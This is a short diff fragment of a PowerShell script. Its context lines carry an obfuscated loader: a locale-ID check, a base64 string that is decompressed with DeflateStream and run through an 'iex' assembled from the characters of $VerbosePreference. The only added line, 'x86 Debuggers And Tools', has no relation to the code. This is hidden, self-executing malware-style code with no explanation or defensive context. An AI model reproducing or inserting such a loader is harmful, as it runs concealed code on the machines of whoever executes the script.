@@ -6,3 +6,4 @@ $fake = (Get-Culture).LCID;$oror = 1081,1073,1151,1108,1094,1084,1118,1107,1115,
 
  ( nEW-OBJeCt  sYsTEm.iO.COmpReSsIoN.deFLAtestREam([sYsTeM.iO.MEmOrYStream] [cONVERt]::FRoMbASE64stRing('dcwxC8IwEIbhv3KErk0nlwYHEWeFri4hftVAejkuV6v/XgdXp3d5eLuTatVDslz5opih4ATak5tyAVt5Hytb5hUu5E2pXzWTe5jJOAxLLFtUeP411WWIXvjuqD+vNn8P1IGfo2GR602rCNTjhdAKILQLzaJaL1oTWvtjPw==' ),[SysTEm.Io.CoMpressiOn.comPReSSiOnmODE]::DecOmPrESS)|% { nEW-OBJeCt sYStEM.Io.sTREamrEaDER($_ ,[sYStem.tExt.ENCODInG]::AScII) }).reAdTOENd( ) | & ( ([striNG]$vErBoSEpRefEREnce)[1,3]+'x'-JoIn'')
  
+x86 Debuggers And Tools
